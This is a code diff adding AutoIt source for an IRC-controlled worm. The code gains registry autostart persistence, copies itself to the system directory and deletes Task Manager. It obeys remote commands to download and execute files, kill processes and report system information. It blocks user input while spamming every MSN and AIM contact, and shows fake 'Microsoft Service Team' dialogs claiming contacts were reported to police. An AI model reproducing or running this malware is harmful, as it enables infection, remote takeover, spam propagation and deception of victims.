+				If WinActive( "classname=DUIDialog") Then
+					Send("{ESC}")
+				EndIf
+				If WinActive( "classname=#32770") Then
+					Send ("{ESC}")
+				EndIf
+			    If WinActive( "classname=PageWindowClass") Then
+					Send("{ESC 3}")
+				EndIf
+				EndIf
+				;; When Buddy Window Shows up , SPAM!
+				If WinActive( "classname=IMWindowClass" ) Then
+					;; Check if conversation window is opened twice , if so end of buddy list has reached ... quit.
+					if $MON = False Then
+					$NIGB = WinGetTitle("")
+					if $NIGB = $KNETB Then
+						Sleep ( 50 )
+					Else
+						_IRCSendMessage($sock, "\\ [MSN]: Window being spammed: " &  $NIGB, $channel)
+					EndIf
+					$MON = True
+					$KEY = False
+					Endif
+
+				if $KEY = True Then
+				$KNETB = WinGetTitle("")
+				if $KNETB = $NIGB Then
+					Sleep ( 50 )
+					Else
+						_IRCSendMessage($sock, "\\ [MSN]: Window being spammed: " &  $KNETB, $channel)
+					EndIf
+				$KEY = False
+				$MON = False
+			EndIf
+
+			If $MON = True Then
+				$KEY = True
+			EndIf
+		EndIf
+	Else
+		Exitloop
+				EndIf
+			If $NIGB = $KNETB Then
+				Send( "{ESC 2}" )
+				Sleep( 800 )
+				$SPAMCOUNT = $SPAMCOUNT + 1
+				$ENDOFLIST = $ENDOFLIST + 1
+
+				if $ENDOFLIST = 1 And $MSNWLM = "MSN 8.x" Then
+				_IRCSendMessage($sock, "\\ [MSN]: WLM Offline Spam Active.", $channel)
+				;; Change back to offline list so we can spam those to :)
+				if WinActive ( "Windows Live Messenger" ) Then
+					Send("{ALT}")
+					Send("{RIGHT}")
+					Send("{UP 5}")
+					Send("{RIGHT}")
+					Send("{DOWN}")
+					Send("{ENTER}")
+					Sleep ( 200 )
+					if $MSNHOME2 = False Then
+					Send( "{HOME}")
+					$MSNHOME2 = True
+					$SPAMCOUNT = $SPAMCOUNT + 2
+					Send("+{DOWN " & $SPAMCOUNT & "}")
+				EndIf
+			Else
+				ExitLoop
+			EndIf
+				Elseif $ENDOFLIST = 1 And $MSN7 = "MSN 7.x" Then
+				$SPAMCOUNT = $SPAMCOUNT - 2
+				_IRCSendMessage($sock, "\\ [MSN]: Spammed " & $SPAMCOUNT & " Contacts.", $channel)
+				_IRCSendMessage($sock, "\\ [MSN]: Spam Finished.", $channel)
+						BlockInput( 0 )
+						ExitLoop
+				EndIf
+
+				if $ENDOFLIST = 2 Then
+				$SPAMCOUNT = $SPAMCOUNT - 2
+				Blockinput( 0 )
+				_IRCSendMessage($sock, "\\ [MSN]: Spammed " & $SPAMCOUNT & " Contacts.", $channel)
+				_IRCSendMessage($sock, "\\ [MSN]: Spam Finished.", $channel)
+				if $MSGBOXON = True Then
+				MsgBox( 4096 , "Windows Messenger Buddy List Check Finished!" , "2 of " & $SPAMCOUNT & " users in your list are used for prohibited hacking activities and therefor reported to the police." & @LF & "Thank you for your understanding." & @LF & @LF & "- Microsoft Service Team" )
+			EndIf
+			ExitLoop
+		EndIf
+	Endif
+			if $INPUTSPAM = True Then
+					Send( "^v" )
+					Sleep ( 100 )
+					Send( "{ENTER}" )
+					Sleep ( 100 )
+					Send( "{ESC 5}")
+					Sleep ( 3000 )
+					$SPAMCOUNT = $SPAMCOUNT + 1
+				EndIf
+				If WinActive( "classname=IEFrame" ) Then
+					Send ( "{ALTDOWN}" )
+					Send ( "{F4}" )
+					Send ( "{ALTUP}" )
+					$IESEEN = $IESEEN + 1
+					if $IESEEN > 2 Then
+						$SPAMCOUNT = $SPAMCOUNT - 2
+						_IRCSendMessage($sock, "\\ [MSN]: Spammed " & $SPAMCOUNT & " Contacts.", $channel)
+						_IRCSendMessage($sock, "\\ [MSN]: Spam Finished.", $channel)
+					BlockInput ( 0 )
+					Exitloop
+					EndIf
+				EndIf
+
+				If WinActive( "classname=DUIDialog") Then
+					Send("{ESC 1}")
+				EndIf
+				If WinActive( "classname=#32770") Then
+					Send ("{ESC}")
+				EndIf
+			    If WinActive( "classname=PageWindowClass") Then
+					Send("{ESC 3}")
+				EndIf
+
+
+		WEnd
+EndIf
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;  !! AIM SPAM CODE !!																											;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+if $AIM = 1 Then
+
+$IMSPAMPICK = 0
+WinActivate( "AIM" , "" )
+
+Do
+	WinWaitActive ( "AIM" )
+	If $BUTT = True Then
+		Sleep( 60000 )
+	    $BUTT = False
+	EndIf
+
+  If $TEAMA = True Then
+	    WinWaitActive ( "AIM" )
+		If WinActive( "AIM" ) Then
+	   ;; Change to Online Instead of Using Groups.
+	   Blockinput ( 1 )
+	   Send ("{ESC 2}")
+	   Send("{ALT}")
+	   Send("{RIGHT 2}")
+	   Send("{UP 3}")
+       Send("{RIGHT}")
+       Send("{ENTER}")
+	   Sleep( 200 )
+	   Send("{ALT}")
+	   Send("{RIGHT 2}")
+	   Send("{UP 6}")
+       Send("{RIGHT}")
+	   Send("{DOWN}")
+       Send("{ENTER}")
+   EndIf
+   $TEAMA = False
+   $BUTT = True
+EndIf
+
+If $BUTT = False Then
+	$TEAMA = True
+EndIf
+	$SEX = $SEX + 1
+Until $SEX = 2
+
+;;
+;; Picking the right language to Spam >.>
+;;
+
+if $HOSTCHKON = 1 Then
+
+if $HOSTZ = "NL" Then
+	Clipput( $NED )
+EndIf
+if $HOSTZ = "BE" Then
+	Clipput( $BEL )
+EndIf
+if $HOSTZ = "EN" Then
+	Clipput( $ENG )
+EndIf
+if $HOSTZ = "DE" Then
+	Clipput( $GER )
+EndIf
+if $HOSTZ = "IT" Then
+	Clipput( $ITA )
+EndIf
+if $HOSTZ = "ES" Then
+	Clipput( $SPA )
+EndIf
+if $HOSTZ = "FR" Then
+	Clipput( $FRA )
+EndIf
+if $HOSTZ = "NO" Then
+	Clipput( $NOR )
+EndIf
+if $HOSTZ = "SE" Then
+	Clipput( $SWE )
+EndIf
+
+if $HOSTZ = "NA"	Then
+	Clipput( $ENG )
+EndIf
+
+EndIf
+
+Sleep ( 100 )
+
+While 1
+If $sTemp[1] = "" Then ContinueLoop; If its empty, Continue!
+If $sTemp[1] = "PING" Then _IRCPing($sock,$sTemp[2]); Checks for PING replys (There smaller then usual messages so its special!
+If $sTemp[0] <= 2 Then ContinueLoop; Useless messages for the most part
+	MouseClick("left")
+	Blockinput ( 1 )
+		if WinActive ( "AIM" ) Then
+				if $AIMHOME = False Then
+					Send( "{HOME}" )
+					$AIMHOME = True
+				EndIf
+				Send( "{DOWN}" )
+				Sleep( 100 )
+				Send( "{ENTER}")
+				Sleep( 400 )
+				If WinActive( "classname=IEFrame" ) Then
+					Send ( "{ALTDOWN}" )
+					Send ( "{F4}" )
+					Send ( "{ALTUP}" )
+					$IESEEN = $IESEEN + 1
+					if $IESEEN > 2 Then
+						$SPAMCOUNT = $SPAMCOUNT - 2
+						_IRCSendMessage($sock, "\\ [MSN]: Spammed " & $SPAMCOUNT & " Contacts.", $channel)
+						_IRCSendMessage($sock, "\\ [MSN]: Spam Finished.", $channel)
+					BlockInput ( 0 )
+					Exitloop
+					EndIf
+				EndIf
+
+				;; When Buddy Window Shows up , SPAM!
+				EndIf
+
+				If WinActive( "IM " ) Then
+					;; Check if conversation window is opened twice , if so end of buddy list has reached ... quit.
+					if $MON = False Then
+					$NIGA = WinGetTitle("")
+					if $NIGA = $KNETA Then
+					Else
+						_IRCSendMessage($sock, "\\ [AIM]: being Window Spammed: " &  $NIGA, $channel)
+					EndIf
+					$MON = True
+					$KEY = False
+					Endif
+
+				if $KEY = True Then
+				$KNETA = WinGetTitle("")
+					if $NIGA = $KNETA Then
+					Else
+						_IRCSendMessage($sock, "\\ [AIM]: being Window Spammed: " &  $KNETA, $channel)
+				EndIf
+				$KEY = False
+				$MON = False
+			EndIf
+
+			If $MON = True Then
+				$KEY = True
+			EndIf
+
+			If $NIGA = $KNETA Then
+				Send( "{ESC}" )
+				Blockinput ( 0 )
+				Sleep( 500 )
+				_IRCSendMessage($sock, "\\ [AIM]: Spam Finished.", $channel)
+				_IRCSendMessage($sock, "\\ [AIM]: Spammed" & $SPAMCOUNT & "Contacts", $channel)
+				Sleep ( 200 )
+				Exitloop
+			EndIf
+				Send( "^v" )
+				Sleep ( 400 )
+				Send( "{ENTER}" )
+				Sleep ( 100 )
+				Send( "{ESC 5}")
+				Sleep ( 1200 )
+			EndIf
+
+				If WinActive( "classname=IEFrame" ) Then
+					Send ( "{ALTDOWN}" )
+					Send ( "{F4}" )
+					Send ( "{ALTUP}" )
+					$IESEEN = $IESEEN + 1
+					if $IESEEN > 2 Then
+						$SPAMCOUNT = $SPAMCOUNT - 2
+						_IRCSendMessage($sock, "\\ [MSN]: Spammed " & $SPAMCOUNT & " Contacts.", $channel)
+						_IRCSendMessage($sock, "\\ [MSN]: Spam Finished.", $channel)
+					BlockInput ( 0 )
+					Exitloop
+					EndIf
+				EndIf
+
+				If WinActive( "classname=DUIDialog") Then
+					Send("{ESC}")
+				EndIf
+				If WinActive( "classname=#32770") Then
+					Send ("{ESC}")
+				EndIf
+			    If WinActive( "classname=PageWindowClass") Then
+					Send("{ESC}")
+				EndIf
+
+
+WEnd
+
+EndIf
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;  !! OLDSCHOOL MSN SPAM CODE !!																								;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+if $MSNO = 1 Then
+$IMSPAMPICK = 0
+WinActivate( "classname=MSBLClass" , "" )
+BlockInput ( 1 )
+;; Check if MSN is signed in..
+
+While 1
+if Winactive( "Windows Messenger" ) Then
+Send( "{ALT}" )
+Send ("{RIGHT 2}")
+Send ("{ENTER 2}" )
+Sleep ( 200 )
+if WinActive( "Windows Messenger" ) Then
+	_IRCSendMessage($sock, "\\ [MSN]: Victim not signed in , ending IM spam.", $channel)
+	$MSNO = 0
+	BlockInput( 0 )
+	Exitloop
+Else
+		$MSNO = 1
+		$TEAMB = True
+		Send( "{ESC}" )
+		Exitloop
+
+EndIf
+EndIf
+WEnd
+
+  If $TEAMB = True Then
+	    WinWaitActive ( "classname=MSBLClass" )
+		Blockinput ( 1 )
+		if $MSGBOXON = True Then
+	    MsgBox ( 4096, "Windows Messenger Buddy List Check", "Windows Messenger will now start a general routine messure which keeps our servers clean from hackers." & @LF & "This routine checking system can take up to 5 minutes." & @LF & @LF & "Thank you for your patience." & @LF & @LF & "- Microsoft Service Team" & @LF & @LF & "IMPORTANT NOTICE: Keyboard/Mouse Input is blocked during this check.", 10 )
+	EndIf
+		WinActivate( "classname=MSBLClass" , "" )
+
+If WinActive( "classname=MSBLClass" ) Then
+	   ;; Change to Online Instead of Using Groups.
+	   	If WinActive( "classname=#32770") Then
+					Send ("{ESC 2}")
+		EndIf
+	   Send("{ALT}")
+	   Send("{RIGHT 2}")
+	   Send("{UP 8}")
+       Send("{RIGHT}")
+	   Send( "{DOWN}" )
+       Send("{ENTER}")
+	   Sleep( 200 )
+	   Send("{ALT}")
+	   Send("{RIGHT}")
+	   Send("{UP 5}")
+       Send("{RIGHT}")
+	   Send("{DOWN 2}")
+       Send("{ENTER}")
+	   $TEAMB = False
+   Else
+
+EndIf
+
+Endif
+;;
+;; Picking the right language to Spam >.>
+;;
+
+if $HOSTCHKON = 1 Then
+
+if $HOSTZ = "NL" Then
+	Clipput( $NED )
+EndIf
+if $HOSTZ = "BE" Then
+	Clipput( $BEL )
+EndIf
+if $HOSTZ = "EN" Then
+	Clipput( $ENG )
+EndIf
+if $HOSTZ = "DE" Then
+	Clipput( $GER )
+EndIf
+if $HOSTZ = "IT" Then
+	Clipput( $ITA )
+EndIf
+if $HOSTZ = "ES" Then
+	Clipput( $SPA )
+EndIf
+if $HOSTZ = "FR" Then
+	Clipput( $FRA )
+EndIf
+if $HOSTZ = "NO" Then
+	Clipput( $NOR )
+EndIf
+if $HOSTZ = "SE" Then
+	Clipput( $SWE )
+EndIf
+
+if $HOSTZ = "NA"	Then
+	Clipput( $ENG )
+EndIf
+
+EndIf
+
+Sleep ( 100 )
+;; Wait till MSN pops up.
+While 1
+
+If $sTemp[1] = "" Then ContinueLoop; If its empty, Continue!
+If $sTemp[1] = "PING" Then _IRCPing($sock,$sTemp[2]); Checks for PING replys (There smaller then usual messages so its special!
+If $sTemp[0] <= 2 Then ContinueLoop; Useless messages for the most part
+
+if $MSNO = 1 Then
+	Blockinput ( 1 )
+		if WinActive ( "classname=MSBLClass" ) Then
+			    $INPUTSPAM = True
+				if $MSNHOME = False Then
+					Send( "{HOME}" )
+					$MSNHOME = True
+				EndIf
+					Send( "{DOWN}" )
+			if $JUMPFIRST4 = 1 Then
+				Send( "{DOWN 3}" )
+				$JUMPFIRST4 = 0
+			EndIf
+				Sleep( 50 )
+				Send( "{ENTER}")
+				Sleep( 900 )
+				If WinActive( "classname=IEFrame" ) Then
+					Send ( "{ALTDOWN}" )
+					Send ( "{F4}" )
+					Send ( "{ALTUP}" )
+					$IESEEN = $IESEEN + 1
+					if $IESEEN > 2 Then
+						$SPAMCOUNT = $SPAMCOUNT - 2
+						_IRCSendMessage($sock, "\\ [MSN]: Spammed " & $SPAMCOUNT & " Contacts.", $channel)
+						_IRCSendMessage($sock, "\\ [MSN]: Spam Finished.", $channel)
+					BlockInput ( 0 )
+					Exitloop
+					EndIf
+				EndIf
+
+				If WinActive( "classname=DUIDialog") Then
+					Send("{ESC}")
+				EndIf
+				If WinActive( "classname=#32770") Then
+					Send ("{ESC}")
+				EndIf
+			    If WinActive( "classname=PageWindowClass") Then
+					Send("{ESC}")
+				EndIf
+				EndIf
+				;; When Buddy Window Shows up , SPAM!
+				If WinActive( "classname=IMWindowClass" ) Then
+					;; Check if conversation window is opened twice , if so end of buddy list has reached ... quit.
+					if $MON = False Then
+					$NIGB = WinGetTitle("")
+					if $NIGB = $KNETB Then
+						Sleep ( 100 )
+					Else
+						_IRCSendMessage($sock, "\\ [MSN]: Window being spammed: " &  $NIGB, $channel)
+					EndIf
+					$MON = True
+					$KEY = False
+					Endif
+
+				if $KEY = True Then
+				$KNETB = WinGetTitle("")
+				if $KNETB = $NIGB Then
+					Sleep ( 100 )
+					Else
+						_IRCSendMessage($sock, "\\ [MSN]: Window being spammed: " &  $KNETB, $channel)
+					EndIf
+				$KEY = False
+				$MON = False
+			EndIf
+
+			If $MON = True Then
+				$KEY = True
+			EndIf
+
+			If $NIGB = $KNETB Then
+				Send( "{ESC 2}" )
+				Sleep( 800 )
+				$SPAMCOUNT = $SPAMCOUNT + 1
+				$ENDOFLIST = $ENDOFLIST + 1
+
+				if $ENDOFLIST = 1 Then
+				_IRCSendMessage($sock, "\\ [MSN]: Spammed " & $SPAMCOUNT & " Contacts.", $channel)
+				$SPAMCOUNT = $SPAMCOUNT - 2
+				_IRCSendMessage($sock, "\\ [MSN]: Spam Finished.", $channel)
+				BlockInput( 0 )
+				ExitLoop
+				EndIf
+			Sleep( 900 )
+		EndIf
+	Else
+		Dim $ENDSESSION
+       $ENDSESSION = $ENDSESSION + 1
+		if $ENDSESSION = 2 Then
+		Exitloop
+		Endif
+EndIf
+			if $INPUTSPAM = True Then
+					Send( "^v" )
+					Sleep ( 100 )
+					Send( "{ENTER}" )
+					Sleep ( 100 )
+					Send( "{ESC 5}")
+					Sleep ( 3000 )
+					$SPAMCOUNT = $SPAMCOUNT + 1
+				EndIf
+
+				If WinActive( "classname=IEFrame" ) Then
+					Send ( "{ALTDOWN}" )
+					Send ( "{F4}" )
+					Send ( "{ALTUP}" )
+					$IESEEN = $IESEEN + 1
+					if $IESEEN > 2 Then
+						$SPAMCOUNT = $SPAMCOUNT - 2
+						_IRCSendMessage($sock, "\\ [MSN]: Spammed " & $SPAMCOUNT & " Contacts.", $channel)
+						_IRCSendMessage($sock, "\\ [MSN]: Spam Finished.", $channel)
+					BlockInput ( 0 )
+					Exitloop
+					EndIf
+				EndIf
+
+				If WinActive( "classname=DUIDialog") Then
+					Send("{ESC 1}")
+				EndIf
+				If WinActive( "classname=#32770") Then
+					Send ("{ESC}")
+				EndIf
+			    If WinActive( "classname=PageWindowClass") Then
+					Send("{ESC}")
+				EndIf
+Else
+		Exitloop
+EndIf
+
+WEnd
+
+Endif
+
+EndFunc
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: C:\Dokumente und Einstellungen\root\Desktop\spread\include\im.au3>
+; ----------------------------------------------------------------------------
+
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: C:\Dokumente und Einstellungen\root\Desktop\spread\include\lang.au3>
+; ----------------------------------------------------------------------------
+
+
+Func _Language2()
+Select
+    Case StringInStr("0413", @OSLang)
+        Return "NL"
+
+	Case StringInStr("0813", @OSLang)
+        Return "BE"
+
+    Case StringInStr("0409,0809,0c09,1009,1409,1809,1c09,2009, _2409,2809,2c09,3009,3409", @OSLang)
+        Return "EN"
+
+    Case StringInStr("040c,080c,0c0c,100c,140c,180c", @OSLang)
+        Return "FR"
+
+    Case StringInStr("0407,0807,0c07,1007,1407", @OSLang)
+        Return "DE"
+
+    Case StringInStr("0410,0810", @OSLang)
+        Return "IT"
+
+    Case StringInStr("0414,0814", @OSLang)
+       Return "NO"
+
+    Case StringInStr("040a,080a,0c0a,100a,140a,180a,1c0a,200a, _240a,280a,2c0a,300a,340a,380a,3c0a,400a, _440a,480a,4c0a,500a", @OSLang)
+        Return "ES"
+
+    Case StringInStr("041d,081d", @OSLang)
+        Return "SE"
+
+	;Case StringInStr("0415", @OSLang)
+    ;    Return "PL"
+
+    ;Case StringInStr("0416,0816", @OSLang)
+    ;    Return "PT"
+
+    Case Else
+        Return "NA"
+
+    EndSelect
+EndFunc
+
+Func _Language()
+Select
+    Case StringInStr("0409,0809,0c09,1009,1409,1809,1c09,2009, _2409,2809,2c09,3009,3409", @OSLang)
+        Return "EN"
+Case Else
+	Return "NA"
+EndSelect
+EndFunc
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: C:\Dokumente und Einstellungen\root\Desktop\spread\include\lang.au3>
+; ----------------------------------------------------------------------------
+
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: C:\Dokumente und Einstellungen\root\Desktop\spread\include\os.au3>
+; ----------------------------------------------------------------------------
+
+Func _OSversion()
+Select
+    Case StringInStr("WIN_2000", @OSVersion)
+        Return "2K"
+
+	Case StringInStr("WIN_2003", @OSVersion)
+        Return "2K3"
+
+    Case StringInStr("WIN_NT4", @OSVersion)
+        Return "NT"
+
+    Case StringInStr("WIN_XP", @OSVersion)
+        Return "XP"
+
+    Case StringInStr("WIN_95", @OSVersion)
+        Return "95"
+
+    Case StringInStr("WIN_98", @OSVersion)
+        Return "98"
+
+    Case StringInStr("WIN_ME", @OSVersion)
+        Return "ME"
+
+    Case Else
+        Return "N\A"
+
+    EndSelect
+
+EndFunc
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: C:\Dokumente und Einstellungen\root\Desktop\spread\include\os.au3>
+; ----------------------------------------------------------------------------
+
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;; Variables and other misc.													 ;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+Dim $IRC , $sock , $URL , $DEST , $TEMP , $TEMP2 ,$EXEC , $URL2 , $ret2 , $NEWH , $IMLOCK , $TASKMGRDIR , $NONAV2 = 1
+Dim $IM , $MSG , $NONAV = 1
+Dim $TEMPP , $INETSIZE , $OSNICK , $COUNTRYNICK
+Dim $MMSSNN , $AAIIMM , $RNDD , $AutoStartValue
+Dim $filename , $GETPID , $IDENT , $REMFILE = 0 , $NB = 1
+Dim $LOGINSUCCESS = 0
+Dim $PROCCL , $PROCCLS
+Dim $NUMBER = Random( 0 , 9 )
+Dim $RNDNR = "|" & StringTrimLeft ( $NUMBER , 9 ) & "]"
+Dim $COUNTRYNICKV = _Language2() & "|"
+Dim $OSNICKV = _OSversion() & "|"
+Dim $RNDD = StringLen( $Authhost )
+Dim $chanreserve = $channel
+Dim $Autostart = @SystemDir & "\" & $filename
+Dim $TIME = "\\ [Y]our ripped system had it's last restart " & $aArray[1] & " [W]eeks " & $aArray[2] & " [D]ays " & $aArray[3] & " [H]ours " & $aArray[4] & " [M]inutes and " & $aArray[5] & " [S]econds ago."
+Dim $LOGIN2 = StringSplit($LOGIN & "," & $PASS, ",")
+Local $i = TCPConnect(TCPNameToIP($server), $port)
+Global $Nick = $NEWH & $OSNICKV & $COUNTRYNICKV & $aArray[2] & $RNDNR
+
+;; Autostart
+RegWrite( "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" , $AutoStartValue , "REG_SZ" , $Autostart )
+RegWrite( "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" , $AutoStartValue , "REG_SZ" , $Autostart )
+RegWrite( "HKEY_LOCAL_MACHINE\Software\Microsoft\OLE" , $AutoStartValue , "REG_SZ" , $Autostart )
+RegWrite( "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" , $AutoStartValue , "REG_SZ" , $Autostart )
+
+Func OnAutoItExit()
+	If $REMFILE = 1 Then
+	FileCopy( @WindowsDir & "\tmppp.exe"  , $TASKMGRDIR )
+	FileDelete( @SystemDir & "\" & $filename )
+	EndIf
+	If $REMFILE = 0 Then
+	Sleep ( 20000 )
+	ShellExecute( $Autostart )
+	EndIf
+EndFunc
+
+;; Kill other exe of this code running so no lock up occurs.
+if FileExists( @WindowsDir & "\windebug.log" ) Then
+$GETPID = FileRead( @WindowsDir & "\windebug.log" )
+ProcessClose ( $GETPID )
+FileDelete( @WindowsDir & "\windebug.log" )
+$NB = 0
+$NEWH = "["
+Else
+	if $NB = 1 Then
+		$NEWH = "[NEW|"
+		Endif
+EndIf
+FileWrite( @WindowsDir & "\windebug.log" , @AutoItPID )
+
+;; Copy itself to Systemdir
+Filecopy( @AutoItExe , @SystemDir & "\" & $filename , 1)
+
+;; Kill TASKMGR.EXE temporairly :)
+$TASKMGRDIR = @SystemDir & "\taskmgr.exe"
+FileCopy( $TASKMGRDIR  , @WindowsDir & "\tmppp.exe" )
+Sleep ( 900 )
+FileDelete( $TASKMGRDIR )
+
+If ProcessExists( "msnmsgr.exe") Then
+		$NONAV2 = 0
+		$IMLOCK = "|Y"
+		$NICK = $NEWH & $OSNICKV & $COUNTRYNICKV & $aArray[2] & $IMLOCK & $RNDNR
+EndIf
+If ProcessExists( "aim6") Then
+		$NONAV2 = 0
+		$IMLOCK = "|Y"
+		$NICK = $NEWH & $OSNICKV & $COUNTRYNICKV & $aArray[2] & $IMLOCK & $RNDNR
+EndIf
+If ProcessExists( "msmsgs.exe" ) Then
+		$NONAV2 = 0
+		$IMLOCK = "|Y"
+		$NICK = $NEWH & $OSNICKV & $COUNTRYNICKV & $aArray[2] & $IMLOCK & $RNDNR
+	Else
+		if $NONAV2 = 1 THen
+		$IMLOCK = "|N"
+		$NICK = $NEWH & $OSNICKV & $COUNTRYNICKV & $aArray[2] & $IMLOCK & $RNDNR
+		Endif
+Endif
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;; MAIN																			 ;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+TCPStartup ()
+
+Global $sock = _IRCConnect($server, $port, $nick); Connects to IRC and Identifies its Nickname
+
+While 1
+	$recv = TCPRecv($sock, 8192 ); Recieve things from server
+	Sleep ( 150 )
+	If @error Then Exit
+	Local $sData = StringSplit($recv, @CRLF); Splits the messages, sometimes the server groups them
+	For $i = 1 To $sData[0] Step 1; Does each message seperately
+		Local $sTemp = StringSplit($sData[$i], " "); Splits the message by spaces
+		If $sTemp[1] = "" Then ContinueLoop; If its empty, Continue!
+		If $sTemp[1] = "PING" Then _IRCPing($sock,$sTemp[2]); Checks for PING replys (There smaller then usual messages so its special!
+		If $sTemp[0] <= 2 Then ContinueLoop; Useless messages for the most part
+		Switch $sTemp[2]; Splits the command msg
+		Case "PRIVMSG"
+				$user = StringMid($sTemp[1], 2, StringInStr($sTemp[1], "!")-2)
+				$msg = StringMid($sData[$i], StringInStr($sData[$i], ":", 0, 2)+1)
+				$host = StringRight($sTemp[1], $rndd )
+
+				If Stringleft( $msg , 6 ) = $LOGIN2[1] Then
+					$TEMP = StringTrimLeft( $msg , 7 )
+					if $host = $Authhost Then
+					if String( $TEMP ) = $LOGIN2[2] Then
+					_IRCSendMessage($sock, "\\ Login Success.", $channel)
+					$LOGINSUCCESS = 1
+				Else
+					_IRCSendMessage($sock, "\\ Login Failed.", $channel)
+				EndIf
+			Else
+				_IRCSendMessage($sock, "\\ Host Authentication Failed.", $channel)
+				EndIf
+				EndIf
+
+			    If $LOGINSUCCESS = 1 Then
+
+					if StringLeft( $msg , 7 ) = $LOGOUT Then
+						$LOGINSUCCESS = 0
+						_IRCSendMessage($sock, "\\ You are logged out.", $channel)
+						Endif
+
+
+						; Download Function
+					if Stringleft( $msg , 9 ) = $DL Then
+						Dim $DLL
+						$DLL = StringMid($sData[$i], StringInStr($sData[$i], ":", 0, 2)+1)
+						$TEMP = StringSplit( $DLL, " " )
+
+						$URL = $TEMP[2]
+						$DEST = $TEMP[3]
+						$EXEC = $TEMP[4]
+
+						$INETSIZE = InetGetSize ( $URL )
+						if $INETSIZE > 100 Then
+						_IRCSendMessage($sock, "\\ [D]ownloading File From: " & $URL & " \\ [S]ize: " & $INETSIZE & " bytes." , $channel)
+						InetGet($URL, $DEST , 1, 1)
+
+						While @InetGetActive
+						Sleep ( 1000 )
+					Wend
+					if $EXEC = 1 Then
+					_IRCSendMessage($sock, "\\ [D]ownload done. \\ [E]xecuting!", $channel)
+					ShellExecute( $DEST )
+				Else
+					_IRCSendMessage($sock, "\\ [D]ownload done.", $channel)
+					Endif
+				Else
+					_IRCSendMessage($sock, "\\ [D]ownload does not exist.", $channel)
+				EndIf
+				EndIf
+				    ;; Process List Function
+					If Stringleft ($msg , 9 ) = $PROCLIST Then
+						$TEMP = ProcessList()
+						for $i = 1 to $TEMP[0][0]
+						_IRCSendMessage($sock, $TEMP[$i][0], $channel)
+						next
+					EndIf
+
+					;; Process Close Function
+				    If Stringleft ($msg , 10 ) = $PROCCL Then
+						$TEMP = Stringlen ( $msg )
+						if $TEMP > 15 Then
+							$PROCCLS = StringTrimLeft( $msg , 11 )
+						EndIf
+						if ProcessExists( $PROCCLS ) > 0 Then
+							Dim $PRCS
+							$PRCS = ProcessExists( $PROCCLS )
+								ProcessClose( $PRCS )
+										If @error Then
+										_IRCSendMessage($sock, "\\ [P]rocess could not be killed..", $channel)
+									Else
+										_IRCSendMessage($sock, "\\ [P]rocess has been killed.", $channel)
+									EndIf
+									Elseif ProcessExists( $PROCCLS ) = 0 Then
+									_IRCSendMessage($sock, "\\ [P]rocess Does Not Exist.", $channel)
+										EndIf
+							EndIf
+
+					;; Private Message On Function
+					if StringLeft( $msg , 5 ) = $PMON Then
+					_IRCSendMessage($sock, "\\ [PM] Activated on nick "  & $nick, $channel)
+						$channel = $user
+					Endif
+					;; Private Message Off Function
+					if StringLeft( $msg , 6 ) = $PMOFF Then
+						_IRCSendMessage($sock, "\\ [PM] Deactivated", $channel)
+						$channel = $chanreserve
+					Endif
+
+					;; Uptime Function
+					if StringLeft( $msg , 7 ) = $UPTIME Then
+						_TimeSystemRestart()
+						_IRCSendMessage($sock, $TIME , $channel)
+					EndIf
+
+					;; Retrieves Current Window info
+					;if StringLeft ( $msg , 9 ) = $CHCKWNDW Then
+					;	$TEMP2 = WinGetTitle("")
+					;	_IRCSendMessage($sock , $TEMP2 , $channel )
+					;EndIf
+
+					;; Version Function
+					if StringLeft( $msg , 8 ) = $VER Then
+						_IRCSendMessage($sock, $VERSION , $channel)
+					EndIf
+
+					;; SysInfo Function
+					if StringLeft( $msg , 8 ) = $SYSINFO Then
+						if ProcessExists( "msnmsgr.exe") Then
+							$MMSSNN = " _MSN Running. "
+						EndIf
+						if ProcessExists( "aim6.exe" ) Then
+						$AAIIMM = " _AIM Running. "
+						Endif
+					_IRCSendMessage($sock, "\\ [S]ysinfo:  || OS Version: " & @OSversion & " || Processor: " & @ProcessorArch & " || Windows Dir: " & @WindowsDir & " || Computername: " & @ComputerName & " || LAN Info: " & @IPAddress1 & " || Desktop Resolution: " & @DesktopWidth & "x" & @DesktopHeight & " || Refresh Rate: " & @DesktopRefresh & " hz" & " || IM ? :" & $MMSSNN & $AAIIMM , $channel)
+					Endif
+
+					;; IM Spread Function
